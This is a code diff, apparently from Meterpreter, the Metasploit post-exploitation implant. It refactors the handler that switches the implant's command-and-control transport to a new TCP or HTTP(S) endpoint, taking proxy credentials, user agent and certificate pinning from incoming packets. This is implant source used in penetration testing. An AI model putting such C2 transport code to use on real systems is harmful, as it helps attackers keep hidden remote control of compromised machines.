@@ -59,16 +59,20 @@ typedef struct _MIGRATECONTEXT
 
 } MIGRATECONTEXT, * LPMIGRATECONTEXT;
 
+
+extern Transport* transport_create_tcp(wchar_t* url);
+extern Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* proxy,
+	wchar_t* proxyUser, wchar_t* proxyPass, PBYTE certHash, int expirationTime, int commsTimeout);
+
 BOOL remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD* pResult)
 {
 	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
 	Packet* response = packet_create_response(packet);
-	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANSPORT_TYPE);
-	char* transportUrl = packet_get_tlv_value_string(packet, TLV_TYPE_TRANSPORT_URL);
-	size_t urlSize;
+	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_TYPE);
+	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
 
 	dprintf("[CHANGE TRANS] Type: %u", transportType);
-	dprintf("[CHANGE TRANS] Url: %s", transportUrl);
+	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
 
 	do
 	{
@@ -78,36 +82,28 @@ BOOL remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD*
 			break;
 		}
 
-		urlSize = mbstowcs(NULL, transportUrl, 0) + 1;
-		remote->pNextTransportUrl = (wchar_t*)calloc(urlSize, sizeof(wchar_t));
-		if (remote->pNextTransportUrl == NULL)
-		{
-			dprintf("[CHANGE TRANS] Couldn't allocate next transport type");
-			break;
-		}
-
-		mbstowcs(remote->pNextTransportUrl, transportUrl, urlSize);
-
 		if (transportType == METERPRETER_TRANSPORT_SSL)
 		{
-			remote->pNextTransportType = _wcsdup(L"TRANSPORT_SSL");
-		}
-		else if (transportType == METERPRETER_TRANSPORT_HTTPS)
-		{
-			remote->pNextTransportType = _wcsdup(L"TRANSPORT_HTTPS");
-		}
-		else if (transportType == METERPRETER_TRANSPORT_HTTP)
-		{
-			remote->pNextTransportType = _wcsdup(L"TRANSPORT_HTTP");
+			remote->nextTransport = transport_create_tcp(transportUrl);
 		}
 		else
 		{
-			dprintf("[CHANGE TRANS] Transport type is invalid");
+			BOOL ssl = transportType == METERPRETER_TRANSPORT_HTTPS;
+			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
+			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_INFO);
+			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
+			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
+			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
+			int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
+			int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMMS_TIMEOUT);
 
-			// fail!
-			free(remote->pNextTransportUrl);
-			remote->pNextTransportUrl = NULL;
-			break;
+			remote->nextTransport = transport_create_http(ssl, transportUrl, ua, proxy,
+				proxyUser, proxyPass, certHash, expirationTimeout, commsTimeout);
+
+			SAFE_FREE(ua);
+			SAFE_FREE(proxy);
+			SAFE_FREE(proxyUser);
+			SAFE_FREE(proxyPass);
 		}
 
 		// tell the server dispatch to exit, it should pick up the new transport
